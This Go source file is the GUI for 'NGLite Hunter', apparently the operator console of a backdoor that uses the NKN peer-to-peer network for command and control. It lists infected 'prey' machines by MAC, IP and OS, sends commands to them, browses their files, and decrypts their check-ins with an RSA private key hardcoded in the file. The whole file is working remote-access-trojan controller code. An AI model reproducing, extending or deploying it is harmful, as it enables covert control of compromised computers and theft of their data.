package gui

import (
	"NGLite/gui/widgets"
	"NGLite/internal/config"
	"NGLite/internal/core"
	"NGLite/module/cipher"
	"fmt"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	nkn "github.com/nknorg/nkn-sdk-go"
)

const (
	RsaPrivateKey = `-----BEGIN PRIVATE KEY-----
MIIEowIBAAKCAQEAximut2j7W5ISBb//heyfumaN5pscUWhgJSAw/dHrlKqFhwU0
pB1wRmMrW7UCEJG0KLMBrXqvak5GWAv4nU/ev9kJohatyFvZYfEEWrlcqHCmJFW5
QcGNnRG52TG8bU6Xk7ide1PTmPmrUlXAEwysg4iYeWxCOpO9c4P7CLw/XyoHZ/yP
Xf/xPJNxxMpaudux1WAZBg+a1j1bilS5MBi60QMmE62OvKl2QpfTqFTDllh+UTou
Nzwt4fnEH5cQnhXxdDH7RGtj1Rnm7w1jwWr4mqGPzuE5KeNlPNPtN770fbSv0qOR
G7HZ4sJFv59Rs9fY7j64dJfNY5sf1Z31reoJIwIDAQABAoIBAHdw/FyUrJz/KFnK
5muEuqoR0oojCCiRbxIxmxYCh6quNZmyq44YKGpkr+ew7LOr/xlg/CvifQTodUHw
xUOctriQS1wlq03O/vIn4eYFQDJO4/WWrflSftcjrg+aCOchrf9eEZ4aYrocEwWn
pgRVaU5G8RCPDkRcdJ7B+HfFb7UdgoHr5/1oeMOCs4pxnq8riBZd9Z3GAcPUkSWq
7Fx/sqHftBZjV7FbA7erRcv4xypAjIp7WvohbYmydDErkDS3rd9Dte+6IG8n3qoS
nwACJFD9byFXdpai7BhfsEAlAh/7dsrivCsnDq0xY9Ee4JRdz6bAXzO3EamlaKAq
5d7tYqECgYEA6AGW7/WnJ27qtGKZZGKIIoE/OPTpJNsEYGQqYiEsrDITYDZZRG+q
B/whtTHm38CEmf4DSx14IB433w/hUBfTrTJCJjM2sRGRftrgh2xPdqK3hVr3Dy50
FeFETTLJlVQOw176CjMcX6+hhas88YhD6lRfNe61SNf7dHXzTMRsJvkCgYEA2qgV
HsU865SvNrHOMHe9y8tIL+x41VbU1c5MwJfvtHONgAPhS+P3m6yrGHdly3LAuteM
95HqRBq6bgN9LgHfRt6hKXZbILGeRgeYKTB1UJ39Z4KpMGkNYdG34Qjgq7FycvMd
SoWxlCWR5YI9h0eSZwjSfzefUSzD9aHTFgj0K/sCgYEAriTDTsps9URkF5IK4Ta0
SHILKo1qkqdy2YdV6OJNzdKoiIdC6gOG9QdjpcYXLcwrvArWHgO4ryL/fQdGb//y
ewZGcLXwT2iIdVeFQSEjZEEuz4I//702lVXJFskQVm4Jxsv7krxah9gkvViTHhjS
IYnDDZBnso2ryPbf8LdfFsECgYBRmRIwpniCjb0JUzdYHQdmKxloUP4S11Gb7F32
LX0VwV2X3VrRYGSB4uECw2PolY1Y7KG9reVXvwW9km2/opE5OFG6UGHXhJFFHwZo
sJ3HFP6BB2CuITYOQB43y4FUcWb9gL54lgXb/F1C4eSmPE5lRwSO1yoMOAF1BAvr
GDJOywKBgCnPnjckt+8nJXmTLkJlU0Klsee0aK5SQ2gXYc4af4U0TJXEhhsDymfN
UcokpJbmBeAiE2b8jnJox96cyVC8wNX395WgWtcTXC0vL/BeSUgfeJMnbQGnDD9j
RFDgdjmKGI/BamxEpmM2wPGhQtGYg6iXGVtCYjCWCjufoq8WS8Y8
-----END PRIVATE KEY-----`
)

type MainWindow struct {
	window fyne.Window
	app    *App

	sessionList  *widgets.SessionListWidget
	commandPanel *widgets.CommandPanelWidget
	logViewer    *widgets.LogViewerWidget
	fileManager  *widgets.FileManagerWidget

	statusLabel *widget.Label
	startBtn    *widget.Button
	stopBtn     *widget.Button
}

func NewMainWindow(fyneApp fyne.App, app *App) *MainWindow {
	w := fyneApp.NewWindow("NGLite Hunter - GUI")
	// 设置最小窗口大小而非固定大小，允许用户调整
	w.Resize(fyne.NewSize(1200, 700))
	w.SetFixedSize(false) // 允许调整窗口大小
	
	mw := &MainWindow{
		window: w,
		app:    app,
	}

	mw.setupUI()
	return mw
}

func (mw *MainWindow) setupUI() {
	mw.statusLabel = widget.NewLabel("状态: 未启动")

	mw.startBtn = widget.NewButtonWithIcon("Start", theme.MediaPlayIcon(), mw.onStartListener)
	mw.stopBtn = widget.NewButtonWithIcon("Stop", theme.MediaStopIcon(), mw.onStopListener)
	mw.stopBtn.Disable()

	newSeedBtn := widget.NewButtonWithIcon("New Seed", theme.ContentAddIcon(), mw.onNewSeed)

	toolbar := container.NewHBox(
		mw.startBtn,
		mw.stopBtn,
		widget.NewSeparator(),
		newSeedBtn,
	)

	mw.sessionList = widgets.NewSessionListWidget(mw.app.sessionMgr)
	mw.commandPanel = widgets.NewCommandPanelWidget(mw.app.dispatcher)
	mw.logViewer = widgets.NewLogViewerWidget(mw.app.logger)
	mw.fileManager = widgets.NewFileManagerWidget(mw.app.dispatcher, mw.window)

	mw.sessionList.SetOnSelect(func(session *core.Session) {
		mw.commandPanel.SetSession(session)
		mw.fileManager.SetSession(session)
		mw.app.logger.Info(fmt.Sprintf("选中会话: %s", session.PreyID))
	})

	configPanel := mw.createConfigPanel()

	tabs := container.NewAppTabs(
		container.NewTabItem("会话控制台", mw.commandPanel),
		container.NewTabItem("文件管理器", mw.fileManager),
		container.NewTabItem("全局日志", mw.logViewer),
		container.NewTabItem("配置设置", configPanel),
	)
	// 确保tabs可以自适应大小
	tabs.SetTabLocation(container.TabLocationTop)

	leftPanel := container.NewBorder(
		widget.NewLabel("在线会话列表"),
		nil,
		nil,
		nil,
		mw.sessionList,
	)

	// 使用HSplit以支持手动拖动调整左右面板大小
	split := container.NewHSplit(
		leftPanel,
		tabs,
	)
	split.SetOffset(0.25) // 初始左侧占25%

	// 使用Border布局确保顶部工具栏固定，主内容区域自适应
	content := container.NewBorder(
		container.NewVBox(toolbar, mw.statusLabel, widget.NewSeparator()),
		nil,
		nil,
		nil,
		split,
	)

	mw.window.SetContent(content)
}

func (mw *MainWindow) createConfigPanel() fyne.CanvasObject {
	cfg := mw.app.config

	seedEntry := widget.NewEntry()
	seedEntry.SetText(cfg.SeedID)
	seedEntry.Disable()

	hunterEntry := widget.NewEntry()
	hunterEntry.SetText(cfg.HunterID)

	aesEntry := widget.NewEntry()
	aesEntry.SetText(cfg.AESKey)

	form := &widget.Form{
		Items: []*widget.FormItem{
			{Text: "Seed ID", Widget: seedEntry},
			{Text: "Hunter ID", Widget: hunterEntry},
			{Text: "AES Key", Widget: aesEntry},
		},
	}

	infoLabel := widget.NewLabel(fmt.Sprintf(
		"当前配置\n传输线程: %d\n\n注意: 修改配置需要重启应用生效",
		cfg.TransThreads,
	))
	infoLabel.Wrapping = fyne.TextWrapWord

	// 使用Scroll容器确保内容过多时可滚动，支持窗口缩小
	content := container.NewVBox(
		form,
		widget.NewSeparator(),
		infoLabel,
	)

	return container.NewScroll(content)
}

func (mw *MainWindow) onStartListener() {
	mw.startBtn.Disable()
	mw.statusLabel.SetText("状态: 正在启动...")
	mw.app.logger.Info("正在启动监听器...")

	go func() {
		err := mw.app.listener.Start(mw.app.config.HunterID, mw.onClientOnline)
		if err != nil {
			mw.statusLabel.SetText("状态: 启动失败")
			mw.app.logger.Error(fmt.Sprintf("监听器启动失败: %v", err))
			mw.startBtn.Enable()
			dialog.ShowError(err, mw.window)
			return
		}

		mw.statusLabel.SetText("状态: ● 监听中")
		mw.app.logger.Info("监听器已启动")
		mw.stopBtn.Enable()
	}()
}

func (mw *MainWindow) onStopListener() {
	err := mw.app.listener.Stop()
	if err != nil {
		mw.app.logger.Error(fmt.Sprintf("停止监听失败: %v", err))
		dialog.ShowError(err, mw.window)
		return
	}

	mw.statusLabel.SetText("状态: 已停止")
	mw.app.logger.Info("监听器已停止")
	mw.stopBtn.Disable()
	mw.startBtn.Enable()
}

func (mw *MainWindow) onClientOnline(msg *nkn.Message) {
	preyIDBytes := rsaDecode(msg.Data)
	preyID := string(preyIDBytes)

	mac, ip, os := core.ParsePreyID(preyID)
	now := time.Now()

	session := &core.Session{
		PreyID:    preyID,
		MAC:       mac,
		IP:        ip,
		OS:        os,
		Status:    core.StatusOnline,
		LastSeen:  now,
		CreatedAt: now,
	}

	mw.app.sessionMgr.AddSession(session)
	mw.app.logger.Info(fmt.Sprintf("新客户端上线: %s", preyID))

	msg.Reply([]byte("OK"))
}

func (mw *MainWindow) onNewSeed() {
	seed, err := config.GenerateNewSeed()
	if err != nil {
		dialog.ShowError(err, mw.window)
		return
	}

	entry := widget.NewMultiLineEntry()
	entry.SetText(seed)
	entry.Wrapping = fyne.TextWrapBreak

	dialog.ShowCustom("新生成的 Seed", "关闭", entry, mw.window)
}

func (mw *MainWindow) Show() {
	mw.window.ShowAndRun()
}

func rsaDecode(data []byte) []byte {
	plaintext, err := cipher.RsaDecrypt(data, []byte(RsaPrivateKey))
	if err != nil {
		return data
	}
	return plaintext
}

